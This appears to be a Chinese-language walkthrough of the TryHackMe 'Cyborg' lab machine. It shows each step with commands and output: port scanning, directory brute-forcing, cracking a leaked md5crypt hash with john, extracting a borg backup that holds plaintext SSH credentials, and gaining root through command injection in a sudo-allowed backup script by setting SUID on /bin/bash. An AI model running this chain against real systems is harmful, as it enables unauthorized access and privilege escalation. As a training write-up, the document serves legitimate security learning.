#服务发现
```
┌──(root💀kali)-[~/tryhackme/Cyborg]
└─# nmap -sV -Pn 10.10.56.66
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.
Starting Nmap 7.91 ( https://nmap.org ) at 2021-10-09 10:32 EDT
Nmap scan report for 10.10.56.66
Host is up (0.31s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 45.80 seconds
```


#爆破目录
```
┌──(root💀kali)-[~/tryhackme/dirsearch]
└─# python3 dirsearch.py -u http://10.10.56.66 -e*

  _|. _ _  _  _  _ _|_    v0.4.2                                             
 (_||| _) (/_(_|| (_| )                                                      
                                                                             
Extensions: php, jsp, asp, aspx, do, action, cgi, pl, html, htm, js, json, tar.gz, bak                                                                    
HTTP method: GET | Threads: 30 | Wordlist size: 15492

Output File: /root/tryhackme/dirsearch/reports/10.10.56.66/_21-10-09_10-55-20.txt

Error Log: /root/tryhackme/dirsearch/logs/errors-21-10-09_10-55-20.log

Target: http://10.10.56.66/

[10:55:21] Starting: 
[10:55:28] 400 -  302B  - /.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd            
[10:55:35] 403 -  275B  - /.ht_wsr.txt                                                                                                                                                                                                                                                                                            
[10:56:08] 301 -  308B  - /admin  ->  http://10.10.56.66/admin/                                                             
[10:56:10] 200 -    6KB - /admin/                                   
[10:56:11] 403 -  275B  - /admin/.htaccess                          
[10:56:11] 200 -    6KB - /admin/?/login                            
[10:56:11] 200 -    5KB - /admin/admin.html                         
[10:56:14] 200 -    6KB - /admin/                                                                                                                                    
[10:57:18] 301 -  306B  - /etc  ->  http://10.10.56.66/etc/                                                                                                                                                                                   
[10:57:18] 200 -  925B  - /etc/                                                                                                                                                                                                              
[10:57:31] 200 -   11KB - /index.html                                       
[10:58:14] 403 -  275B  - /server-status                                    
[10:58:14] 403 -  275B  - /server-status/ 
```

在```http://10.10.56.66/etc/squid/passwd```找到一个登陆凭证

>music_archive:$apr1$BpZ.Q.1m$F0qqPwHSOG50URuOVQTTn.

保存到本地，用john破解
```
┌──(root💀kali)-[~/tryhackme/Cyborg]
└─# john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt 
Created directory: /root/.john
Warning: detected hash type "md5crypt", but the string is also recognized as "md5crypt-long"
Use the "--format=md5crypt-long" option to force loading these as that type instead
Using default input encoding: UTF-8
Loaded 1 password hash (md5crypt, crypt(3) $1$ (and variants) [MD5 128/128 AVX 4x3])
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
squidward        (music_archive)
1g 0:00:00:00 DONE (2021-10-09 10:43) 4.761g/s 185600p/s 185600c/s 185600C/s 112806..samantha5
Use the "--show" option to display all of the cracked passwords reliably
Session completed

```
得到登陆凭证：```music_archive:squidward```，但是无法通过ssh登陆

在首页dowmload一个压缩包```archiver.tar```，解压后得到几个文件
```
┌──(root💀kali)-[~/…/home/field/dev/final_archive]
└─# ls
config  data  hints.5  index.5  integrity.5  nonce  README
                                                                                                                                                                                                                                             
```

查看readme，这个是一个brog仓库

在kali本地安装brog以后，使用上面的密码析出文件一个```home```文件
```
┌──(root💀kali)-[~/…/Cyborg/home/field/dev]
└─# borg extract ./final_archive::music_archive
Enter passphrase for key /root/tryhackme/Cyborg/home/field/dev/final_archive: 
                                                                                                                                                                                                                                             
┌──(root💀kali)-[~/…/Cyborg/home/field/dev]
└─# ls
final_archive  home

```

找到alex的登录凭证：
```
┌──(root💀kali)-[~/…/dev/home/alex/Documents]
└─# cat note.txt  
Wow I'm awful at remembering Passwords so I've taken my Friends advice and noting them down!

alex:S3cretP@s3

```


#登录alex账号，拿到user flag
```
┌──(root💀kali)-[~/tryhackme/Cyborg]
└─# ssh alex@10.10.56.66                                                                                                                                                                                                                130 ⨯
alex@10.10.56.66's password: 
Welcome to Ubuntu 16.04.7 LTS (GNU/Linux 4.15.0-128-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage


27 packages can be updated.
0 updates are security updates.


The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.

alex@ubuntu:~$ ls
Desktop  Documents  Downloads  Music  Pictures  Public  Templates  user.txt  Videos
alex@ubuntu:~$ cat user.txt
flag{1_hop3_y0u_ke3p_th3_arch1v3s_saf3}
```

#查看本账户root权限
```
alex@ubuntu:~$ sudo -l
Matching Defaults entries for alex on ubuntu:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User alex may run the following commands on ubuntu:
    (ALL : ALL) NOPASSWD: /etc/mp3backups/backup.sh

```

我们查看backup.sh的源代码

```
alex@ubuntu:~$ cat /etc/mp3backups/backup.sh
#!/bin/bash

sudo find / -name "*.mp3" | sudo tee /etc/mp3backups/backed_up_files.txt


input="/etc/mp3backups/backed_up_files.txt"
#while IFS= read -r line
#do
  #a="/etc/mp3backups/backed_up_files.txt"
#  b=$(basename $input)
  #echo
#  echo "$line"
#done < "$input"

while getopts c: flag
do
        case "${flag}" in 
                c) command=${OPTARG};;
        esac
done



backup_files="/home/alex/Music/song1.mp3 /home/alex/Music/song2.mp3 /home/alex/Music/song3.mp3 /home/alex/Music/song4.mp3 /home/alex/Music/song5.mp3 /home/alex/Music/song6.mp3 /home/alex/Music/song7.mp3 /home/alex/Music/song8.mp3 /home/alex/Music/song9.mp3 /home/alex/Music/song10.mp3 /home/alex/Music/song11.mp3 /home/alex/Music/song12.mp3"

# Where to backup to.
dest="/etc/mp3backups/"

# Create archive filename.
hostname=$(hostname -s)
archive_file="$hostname-scheduled.tgz"

# Print start status message.
echo "Backing up $backup_files to $dest/$archive_file"

echo

# Backup the files using tar.
tar czf $dest/$archive_file $backup_files

# Print end status message.
echo
echo "Backup finished"

cmd=$($command)
echo $cmd
```

看源码是备份所有.mp3文件
我一开始还以为是通过```tar```命令提权，因为假如一个文件的名字叫```xxx.mp3  --checkpoint=1```可以被执行的话，那就可以通过tar执行一个shell，但是反复试了多次还是不行

后来看大佬的writeup，发现重点是在这段代码（我一开始没看明白这段是在表达什么，所以遗漏了这个提权点）：
```
while getopts c: flag
do
        case "${flag}" in 
                c) command=${OPTARG};;
        esac
done

...
cmd=$($command)
echo $cmd
```

它实际上相当于接收一个"-c"的命令，然后再执行这个命令，例如

```
alex@ubuntu:~/Music$ sudo /etc/mp3backups/backup.sh -c whoami

root
```


加SUID到bash命令，提权到root
```
sudo /etc/mp3backups/backup.sh -c "chmod +s /bin/bash"
alex@ubuntu:~/Music$ bash -p
bash-4.3# whoami
root
bash-4.3# cat /root/root.txt 
flag{Than5s_f0r_play1ng_H0p£_y0u_enJ053d}
```


